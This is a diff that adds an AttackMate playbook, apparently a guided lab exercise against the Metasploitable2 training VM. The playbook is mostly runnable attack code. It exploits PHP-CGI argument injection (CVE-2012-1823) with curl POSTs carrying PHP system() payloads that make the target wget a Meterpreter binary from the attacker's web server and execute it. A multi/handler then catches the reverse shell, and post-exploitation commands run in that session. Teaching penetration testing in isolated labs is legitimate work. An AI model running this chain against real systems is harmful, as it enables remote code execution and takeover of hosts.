@@ -1,0 +1,181 @@
+#
+# Walkthrough 2: PHP CGI RCE with Payload Delivery
+#
+# Description:
+#     Guided walkthrough of generating a Meterpreter payload, serving it
+#     via AttackMate's built-in web server, exploiting PHP-CGI argument
+#     injection (CVE-2012-1823) on Metasploitable2 to download and execute
+#     the payload, and catching the reverse shell with multi/handler.
+#
+#     Attack steps:
+#     1. Create a temporary file for the payload
+#     2. Generate a Meterpreter ELF payload with msf-payload
+#     3. Serve the payload over HTTP with webserv (background)
+#     4. Start a reverse shell listener with multi/handler (background)
+#     5. Exploit PHP-CGI to download the payload to the target
+#     6. Exploit PHP-CGI to execute the payload
+#     7. Run post-exploitation commands in the Meterpreter session
+#
+# Background:
+#     CVE-2012-1823 is a PHP-CGI argument injection vulnerability. When PHP
+#     runs as a CGI handler, query string parameters are passed to the PHP
+#     binary as arguments. By injecting "-d allow_url_include=on" and
+#     "-d auto_prepend_file=php://input", the request body is executed as
+#     PHP code. Metasploitable2's Apache uses an affected PHP version.
+#     See handout 03_payload_delivery.md for the manual walkthrough.
+#
+# Requirements:
+#     - Metasploitable2 VM running and reachable
+#     - Attacker reachable for Meatasploitable on ports 8080 and 4344
+#     - curl installed on the attacker machine
+#     - msfrpcd running: msfrpcd -P msf -a 127.0.0.1
+#     - Run with: attackmate --config ../config.yml 02_php_rce_payload.yml
+#
+# IMPORTANT: Replace METASPLOITABLE and ATTACKER, also in the PHP_RCE_URL with your actual IPs!
+#
+
+vars:
+  METASPLOITABLE: 192.168.56.101
+  ATTACKER: 192.168.56.1
+  PAYLOAD: linux/x86/meterpreter/reverse_tcp
+  LPORT: "4344"
+  WEBSERV_PORT: "8080"
+  # The PHP-CGI injection URL. The query string enables include wrappers
+  # and sets the prepend file to php://input (the request body).
+  PHP_RCE_URL: 'http://192.168.56.101/index.php?-d+allow_url_include%3don+-d+auto_prepend_file%3dphp://input'
+
+commands:
+  # ============================================
+  # STEP 1: Create a temporary file for the payload
+  #
+  # mktemp creates a temp file and stores its path in $RSHELL.
+  # The file is automatically deleted when AttackMate exits.
+  # ============================================
+  - type: mktemp
+    cmd: file
+    variable: RSHELL
+
+  - type: debug
+    cmd: "Payload will be saved to: $RSHELL"
+
+  # ============================================
+  # STEP 2: Generate the Meterpreter payload
+  #
+  # msf-payload generates the binary and saves it to $RSHELL.
+  # - cmd:             the payload type (staged, Linux, x86, Meterpreter)
+  # - format: elf      Linux ELF executable
+  # - local_path:      where to save the generated binary
+  # - payload_options: LHOST and LPORT for the reverse connection
+  # ============================================
+  - type: msf-payload
+    cmd: $PAYLOAD
+    format: elf
+    local_path: $RSHELL
+    payload_options:
+      LHOST: $ATTACKER
+      LPORT: $LPORT
+
+  - type: debug
+    cmd: "Payload generated at $RSHELL"
+
+  # ============================================
+  # STEP 3: Serve the payload via webserv
+  #
+  # webserv starts an HTTP server in the background that serves $RSHELL.
+  # - background: True   means AttackMate continues to the next command
+  #                      immediately without waiting for the server to stop
+  # - kill_on_exit: True means the server process is killed when the
+  #                      playbook finishes
+  # - keep_serving: False is the default: the server shuts down after the
+  #                      first successful download
+  # ============================================
+  - type: webserv
+    local_path: $RSHELL
+    port: $WEBSERV_PORT
+    background: True
+    kill_on_exit: True
+
+  # Brief pause to ensure the web server is ready before we use it
+  - type: sleep
+    seconds: 5
+
+  # ============================================
+  # STEP 4: Start the reverse shell listener
+  #
+  # exploit/multi/handler listens for incoming Meterpreter connections.
+  # It runs in background because it needs to wait while we trigger
+  # the payload execution in later steps.
+  # ============================================
+  - type: msf-module
+    cmd: exploit/multi/handler
+    payload: $PAYLOAD
+    payload_options:
+      LHOST: $ATTACKER
+      LPORT: $LPORT
+    creates_session: shell
+    background: True
+    kill_on_exit: True
+
+  # ============================================
+  # STEP 5: Exploit PHP-CGI to download the payload
+  #
+  # The PHP code in -d (the request body) runs system() on the target.
+  # wget downloads the payload from our webserv to /tmp/shell on the target.
+  #
+  # The URL injects PHP INI options:
+  #   -d allow_url_include=on      allows include() with remote URLs
+  #   -d auto_prepend_file=php://input  executes the request body as PHP
+  # ============================================
+  - type: shell
+    cmd: curl -XPOST "$PHP_RCE_URL" -d "<?php system('wget -O /tmp/shell6 http://${ATTACKER}:${WEBSERV_PORT}')?>"
+
+  - type: debug
+    cmd: "Download command sent. Waiting for target to fetch payload..."
+
+  - type: sleep
+    seconds: 5
+
+  # ============================================
+  # STEP 6: Exploit PHP-CGI to execute the payload
+  #
+  # Make the payload executable and run it in the background (&).
+  # The payload connects back to our multi/handler listener.
+  # This command also runs in background because the payload process
+  # stays running on the target indefinitely.
+  # ============================================
+  - type: shell
+    cmd: curl -XPOST "$PHP_RCE_URL" -d "<?php system('chmod +x /tmp/shell6 && /tmp/shell6 &')?>"
+    background: True
+    kill_on_exit: True
+
+  - type: debug
+    cmd: "Execute command sent. Waiting for reverse shell connection..."
+
+  # Wait for the Meterpreter session to connect back
+  - type: sleep
+    seconds: 5
+
+  # ============================================
+  # STEP 7: Post-exploitation in the Meterpreter session
+  #
+  # The session name "shell" was set in creates_session on multi/handler.
+  # We use stdapi: True to call Meterpreter built-in commands.
+  # ============================================
+  - type: msf-session
+    session: shell
+    stdapi: True
+    cmd: sysinfo
+
+  - type: debug
+    cmd: "Sysinfo: $RESULT_STDOUT"
+
+  - type: msf-session
+    session: shell
+    stdapi: True
+    cmd: getuid
+
+  - type: debug
+    cmd: "Current user: $RESULT_STDOUT"
+
+  - type: debug
+    cmd: "Walkthrough complete. Check output.log for results."
